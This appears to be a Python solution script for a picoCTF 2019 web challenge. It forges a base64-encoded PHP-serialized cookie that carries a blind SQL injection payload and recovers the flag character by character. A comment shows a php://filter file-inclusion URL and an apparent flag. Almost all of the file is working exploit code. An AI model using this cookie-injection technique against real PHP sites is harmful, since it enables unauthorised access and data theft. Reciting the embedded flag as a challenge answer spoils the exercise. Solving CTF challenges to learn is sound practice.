import base64
import requests
import string
import sys
# https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=cookie
#picoctf{c9f6ad462c6bb64a53c6e7a6452a6eb7}
password = 'picoctf'
while True:
    for c in string.ascii_letters+string.digits+"{}":
        inject = "'or password like '"+(password + c)+"%"
        php_serialize = 'O:8:"siteuser":2:{s:8:"username";s:5:"admin";s:8:"password";s:'+str(len(
            inject))+':"' + inject + '";}"'

        user_info = base64.b64encode(php_serialize.encode()).decode()

        url = "https://2019shell1.picoctf.com/problem/62195/index.php?file=admin"
        headers = {'Cookie': "user_info=" + user_info}
        response = requests.get(url, headers=headers)

        if "You are not admin!" in response.text:
            pass
        else:
            password += c
            print(password)
            break
